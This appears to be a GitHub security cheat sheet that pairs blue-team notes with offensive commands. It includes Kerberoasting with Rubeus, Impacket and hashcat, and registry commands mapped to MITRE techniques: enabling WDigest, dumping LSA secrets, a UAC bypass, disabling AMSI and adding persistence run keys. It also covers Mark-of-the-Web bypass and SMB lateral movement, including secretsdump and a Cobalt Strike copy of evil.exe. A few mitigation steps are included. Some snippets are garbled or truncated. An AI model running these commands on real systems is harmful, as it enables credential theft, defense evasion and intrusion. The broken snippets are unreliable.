
# Blue team

## Gootloader

Remove these malicious registries from the system.

```
HKCU\SOFTWARE\Microsoft\Phone\%USERNAME%
HKCU\SOFTWARE\Microsoft\Phone\%USERNAME%0
HKCU\SOFTWARE\Microsoft\Personalization\%USERNAME%
HKCU\SOFTWARE\Microsoft\Personalization\%USERNAME%0
HKCU\SOFTWARE\Microsoft\Fax\%USERNAME%
HKCU\SOFTWARE\Microsoft\Fax\%USERNAME%0
HKCU\SOFTWARE\Microsoft\Personalization\%RANDOMVALUE%
```

## In azure pay head to ...

https://www.netspi.com/blog/technical/cloud-penetration-testing/attacking-azure-with-custom-script-extensions/

https://www.tenable.com/policies/[type]/AC_AZURE_0200

1. **Custom Script Extension**: It's like a tool that lets you tell your virtual machine to do extra stuff when it's being set up.
    
2. **Script Download Location (Windows VMs)**: If you're using this tool on a Windows virtual machine, any extra scripts you tell it to use will be put in a specific folder:
```
C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\<agent_version>\Downloads\
```

  
   Think of this as a place where the VM stores the special instructions (scripts) it needs to follow.
  
- **Script Execution Output Location (Windows VMs)**: After the VM follows those instructions, the results or output of those instructions will be stored in another folder:

```
C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\<agent_version>\Status
```

   This is like checking what happened after your VM did the special things you asked it to do.
   
- **Script Location (Linux VMs)**: If you're using this tool on a Linux virtual machine, both the special instructions and the results are stored in the same folder:

```
/var/lib/waagent/run-command/download/
```

It's like a combined place for both the special instructions and what happened as a result.


# Attacks
# RDP abused ...
### RustDesk

The RustDesk installer may configure a Windows host firewall rule for client
communication:
```powershell
netsh advfirewall firewall add rule name="RustDesk Service" dir=in
action=allow
program="C:\Program Files\RustDesk\RustDesk.exe" 		
enable=yes
```


The RustDesk installer may add registry keys for the installed client:
```powershell
reg add HKEY_CLASSES_ROOT\.rustdesk\shell\open\command /f /ve 		
/t REG_SZ /d "\"C:\Program Files\RustDesk\RustDesk
exe\" --play \"%1\""

reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\
CurrentVersion\Uninstall\RustDesk /f /v UninstallString /t REG_SZ /d "\"C:\Program Files\
RustDesk\RustDesk.exe\" --uninstall
```


The RustDesk installer may create a service, with or without an imported
configuration option, for the installed client:

```powershell
sc create RustDesk binpath= "\"C:\Program Files\RustDesk\RustDesk.
exe\" --import-config \"C:\Users\[REDACTED Path]\AppData\Roaming\
RustDesk\config\RustDesk.toml\"" start= auto DisplayName= "RustDesk
Service"

sc create RustDesk binpath= "\"C:\Program Files\RustDesk\RustDesk.
exe\" --service" start= auto DisplayName= "RustDesk Service
```


### FleetDeck

The adversary tested the internet connection to FleetDeck domain:
```
ping fleetdeck.io
```

The adversary dropped the FleetDeck agent to the victim environment:
```
C:\Users\[REDACTED Path]\Downloads\fleetdeck-agent-[REDACTED
22CharacterKey].exe
```

The adversary created a Windows host firewall rule via PowerShell for FleetDeck
client communication:
```
C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe -Command
"New-NetFirewallRule -DisplayName 'FleetDeck Agent Service' -Name
'FleetDeck Agent Service Command' -Direction Inbound -Program 'C:\
Program Files (x86)\FleetDeck Agent\fleetdeck_agent_svc.exe' -Action
Allow"
```

## Remediation

1. Monitor for unexpected host firewall changes.

2. Strengthen firewall rules and network access control lists.
 
3. Implement application allow-listing.

--------------

![image](https://github.com/mccleod1290/Practical-Threat-Hub/assets/144599723/cfe48f09-95c4-4cd0-9df0-b9dec2b05ea9)
Credits to image - https://www.youtube.com/watch?v=ajOr4pcx6T0
# 1.  Rubeus
https://tryhackme.com/room/attackingkerberos

https://dmcxblue.gitbook.io/red-team-notes-2-0/active-directory/active-directory-attacks/kerberoasting

https://www.hackingarticles.in/a-detailed-guide-on-rubeus/

Harvest TGT every x seconds
```
rubeus.exe harvest /interval:30
```

**Basic Kerberoasting:**

- _Description:_ Extracts the KRB_TGS ticket for a specified SPN and attempts to brute force the service account password.
  
```
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local
```

 
- **TGT Delegation Trick:**
 
  - _Description:_ Uses the `/tgtdeleg` flag to perform a TGT delegation trick, roasting all RC4-enabled accounts.
```
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /tgtdeleg
```

- **Roasting AES-Enabled Accounts:**
  
  - _Description:_ Uses the `/aes` flag to roast all AES-enabled accounts while using KerberosRequestorSecurityToken.
  
```
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /aes
```


- **Roasting with Alternate Credentials:**
 
  - _Description:_ Performs Kerberoasting and searches for users using alternate domain credentials.
  - _Command:_

```
 rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /creduser:ignite.local\Administrator /credpassword:Ignite@987
```

# 2. Powersploit
## [SYNTAX](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)

```
Invoke-Kerberoast [[-Identity] <String[]>] [-Domain <String>] [-LDAPFilter <String>] [-SearchBase <String>]
 [-Server <String>] [-SearchScope <String>] [-ResultPageSize <Int32>] [-ServerTimeLimit <Int32>] [-Tombstone]
 [-OutputFormat <String>] [-Credential <PSCredential>]
```

## DESCRIPTION

Uses Get-DomainUser to query for user accounts with non-null service principle names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information. The ticket format can be specified with -OutputFormat \<John/Hashcat>.

## EXAMPLES

### -------------------------- EXAMPLE 1 --------------------------

```
Invoke-Kerberoast | fl
```

### -------------------------- EXAMPLE 2 --------------------------

```
Invoke-Kerberoast -Domain dev.testlab.local | fl
```

### -------------------------- EXAMPLE 3 --------------------------

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
```


# 3.  Bloodhound or sharp hound
https://tryhackme.com/room/attackingkerberos

```powershell
Invoke-BloodHound -CollectionMethod All
```

# 4.  Impacket

Impacket Installation - 

Impacket releases have been unstable since 0.9.20 better install < 0.9.20 or use python virtual environment.

1.) `cd /opt` navigate to your preferred directory to save tools in 

2.) download the precompiled package from [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)

3.) `cd Impacket-0.9.19` navigate to the impacket directory

4.) `pip install .` - this will install all needed dependencies

Kerberoasting w/ Impacket - 

1.) `cd /usr/share/doc/python3-impacket/examples/` - navigate to where GetUserSPNs.py is located

2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash


# 5.  Sharp Roast

#### This project has now been deprecated. Its functionality has been incorporated into [Rubeus](https://github.com/GhostPack/Rubeus) via the "kerberoast" action, which provides proper ASN.1 structure parsing.

```
C:\Temp>SharpRoast.exe all
SamAccountName         : harmj0y
DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
ServicePrincipalName   : asdf/asdfasdf
Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...

SamAccountName         : sqlservice
DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$9994D1...

```

----------------------

# Registry Attacks

### Boot or Logon Autostart Execution (T1547)

- **Command for Adding a Run Key:**

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ExampleKey /t REG_SZ /d "C:\Path\To\Payload.exe" /f
```

- **Command for Adding a RunOnce Key:**

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v ExampleKey /t REG_SZ /d "C:\Path\To\Payload.exe" /f
```
  
### OS Credential Dumping (T1003)

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

   
- **Command for Accessing LSA Secrets Registry:**
```
 reg save HKLM\SECURITY\Policy\Secrets C:\Path\To\DumpedSecrets.hiv
```  

### Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002)

- **Command for Modifying UAC Bypass Registry Key:**

```
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v ExampleKey /t REG_SZ /d "C:\Path\To\Payload.exe" /f
``` 

### Inhibit System Recovery (T1490)

- **Command for Modifying BCD Objects Registry Key:**
```
reg add HKLM\BCD00000000\Objects /v ExampleKey /t REG_SZ /d "C:\Path\To\Payload.exe" /f
```

- **Command for Modifying BitLocker Ransomware Registry:**
```
reg add HKLM\SOFTWARE\Policies\Microsoft\FVE /v ExampleKey /t REG_SZ /d "C:\Path\To\Payload.exe" /f
``` 

### Execution Guardrails (T1480.001)

- **Command for Storing Payload in Registry:**

```
reg add HKCU\SOFTWARE /v ExampleKey /t REG_BINARY /d 0x4D5A90000300000004000000... /f 
```



### Impair Defenses (T1562)

- **Command for Disabling AMSI:**
```
reg add HKLM\SOFTWARE\Microsoft\Windows Script\Settings /v AmsiEnable /t REG_DWORD /d 0 /f
```

- **Command for Modifying AMSI Providers Registry:**
```
reg add HKLM\SOFTWARE\Microsoft\AMSI\Providers /v ExampleProvider /t REG_SZ /d "C:\Path\To\Payload.dll" /f
```

### Indicator Removal (T1070)

- **Command for Clearing RecentDocs Registry:**
```
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs /f
``` 

### Subvert Trust Controls: SIP and Trust Provider Hijacking (T1553.003)

- **Command for Modifying Trust Provider Registry:**

```
reg add HKLM\SOFTWARE\Microsoft\Cryptography\Providers\Trust /v ExampleTrust /t REG_SZ /d "C:\Path\To\Payload.dll" /f
```  

### Subvert Trust Controls: Install Root Certificate (T1553.004)

- **Command for Modifying ROOT Certificates Registry:**
```
reg add HKLM\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates /v ExampleCert /t REG_BINARY /d 0x308203BD30820326... /f
```  

 
 Replace "ExampleProvider," "C:\Path\To\Payload.dll," "ExampleTrust," "C:\Path\To\Payload.dll," "ExampleCert," and "0x308203BD30820326..." with your specific values. Always exercise caution and ensure you have the appropriate permissions when making registry modifications.


----------------

# Exploiting Setuid and Setgid Bits

- **Command to Check Setuid/Setgid Binaries:**
```
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
```
  
- **Command to Exploit a Vulnerable Setuid Binary:**

```
./vulnerable_binary
```

### Mitigation Commands

- **Command to Set Correct File Permissions:**

```
chmod go-s /usr/bin/some_binary
```

- **Command to Mount Filesystems with nosuid Flag:**
```
 mount -o remount,nosuid /path/to/filesystem`
```
  
These commands are illustrative and may need adaptation based on the specific binaries and file paths relevant to your environment. Additionally, it's crucial to customize these commands based on your system's configurations and security policies.

-------------

# Examples of Adversarial Actions [Mark of the web]

Windows uses the Mark-of-the-Web (MotW) to indicate that a file originated
from the Internet, which gives Microsoft Defender SmartScreen an opportunity
to perform additional inspection of the content.

1. **Creating a Container File Format That Doesn't Support NTFS:**
```
mkisofs -o malicious.iso /path/to/malicious/files
```

- **Using a Utility That Doesn't Honor MotW:**
```
7z a malicious.7z /path/to/malicious/files 
```

- **Appending Malicious Code to a PE File Without Invalidating Signature:**
```
echo "malicious code" >> legitimate.exe
```

As of this writing, the following extensions are considered high risk
by default:

```
.ade, .adp, .app, .asp, .cer, .chm, .cnt, .crt, .csh, .der, .fxp, .gadget, .grp, .hlp, .hpj,
.img, .inf, .ins, .iso, .isp, .its, .js, .jse, .ksh, .mad, .maf, .mag, .mam, .maq, .mar, .mas,
.mat, .mau, .mav, .maw, .mcf, .mda, .mdb, .mde, .mdt, .mdw, .mdz, .msc, .msh, .msh1,
.msh1xml, .msh2, .msh2xml, .mshxml, .msp, .mst, .msu, .ops, .pcd, .pl, .plg, .prf, .prg,
.printerexport, .ps1, .ps1xml, .ps2, .ps2xml, .psc1, .psc2, .psd1, .psm1, .pst, .scf, .sct,
.shb, .shs, .theme, .tmp, .url, .vbe, .vbp, .vbs, .vhd, .vhdx, .vsmacros, .vsw, .webpnp,
.ws, .wsc, .wsf, .wsh, .xnk
```


Exploiting vulnerabilities (e.g., CVE-2020-1599) to append malicious code to signed PE files without invalidating the signature.

Microsoft issues patches for MotW bypass vulnerabilities (e.g., CVE-2022-41091) to enhance defense.

--------------

# SMB/Windows Admin Shares - In-Depth Analysis

#### **Introduction:**

Adversaries leverage SMB and Windows Admin Shares for lateral movement and payload execution within Windows environments. Windows Admin Shares, like ADMIN$, IPC$, C$, and FAX$, are native to the SMB protocol, providing adversaries an avenue for privilege escalation and lateral movement.

#### **Adversarial Exploitation:**

Adversaries exploit SMB/Windows Admin Shares for multiple reasons:

- **Payload Staging:** Adversaries use these shares to stage payloads for execution.
- **Lateral Movement:** Facilitates movement across a network, blending with routine administrative behavior.
- **Privilege Escalation:** Tools like PsExec leverage Admin Shares for remote system management, enabling privilege escalation.

#### **Common Offensive Tools:**

Various tools are employed for exploiting SMB/Windows Admin Shares:

- **PsExec:** Widely used for executing processes on remote systems.
- **Impacket’s SMBexec and WMIexec:** Offensive tools for SMB and WMI interaction.
- **net.exe:** Native utility for network-related tasks.
- **C2 Frameworks:** Almost every Command and Control framework leverages SMB for lateral movement.

#### **Associated Threats:**

Adversaries, including Emotet and Qbot, abuse SMB/Windows Admin Shares for lateral movement and privilege escalation.

#### **Patterns of Malicious Activity:**

1. **Remote File Copy and Retrieval:**
    
    - Adversaries utilize utilities like **Impacket’s secretsdump** to extract sensitive files, e.g., ntds.dit (Active Directory database).
    - **SMBexec** with the `-use-vss` parameter is used for remote file copying, creating temporary shares for data extraction.

```
smbexec.py -use-vss <target> secretsdump
```

- **Lateral Movement and Privilege Escalation:**
    
    - **Cobalt Strike** beacons use built-in functionalities for lateral movement.
    - Beacon implants leverage the Service Control Manager to copy binaries to the ADMIN$ share for execution.


```
execute as_user "copy evil.exe \\<target>\ADMIN$"
```

#### **Defensive Actions:**

1. **Block Inbound SMB Connections:**
    
    - Use Group Policy Objects (GPO) to block inbound SMB connections to workstations and most servers.
2. **Disable Administrative/Hidden Shares:**
    
    - Investigate the viability of disabling Admin Shares via GPO or registry modifications.
```
reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v AutoShareWks /t REG_DWORD /d 0 /f
```

3. **Disable the Lanman Server Service:**
    
    - This service enables file, print, and named-pipe sharing. Disabling it restricts SMB functionality.

```
sc config lanmanserver start= disabled
```
4. **Deploy Windows Local Administrator Password Policy:**
    
    - Utilize Windows Local Administrator Password Solution (LAPS) to prevent password reuse across devices.
  


#### **Additional Considerations:**

- **Restrict Service Accounts:**
    - Limit service accounts from logging on locally or through Remote Desktop Services.
- **Access Control:**
    - Limit who has the ability to access Admin Shares.

#### **References:**

Mandiant Ransomware Protection and Containment Strategies.
https://www.mandiant.com/sites/default/files/2022-03/Ransomare%20Protection%20and%20Containment%20Strategies%20Report_Mandiant.pdf
#### **Conclusion:**

Understanding and mitigating the abuse of SMB/Windows Admin Shares is crucial for preventing lateral movement and privilege escalation within Windows environments. Implementing robust defenses and applying best practices can significantly reduce the risk of exploitation.

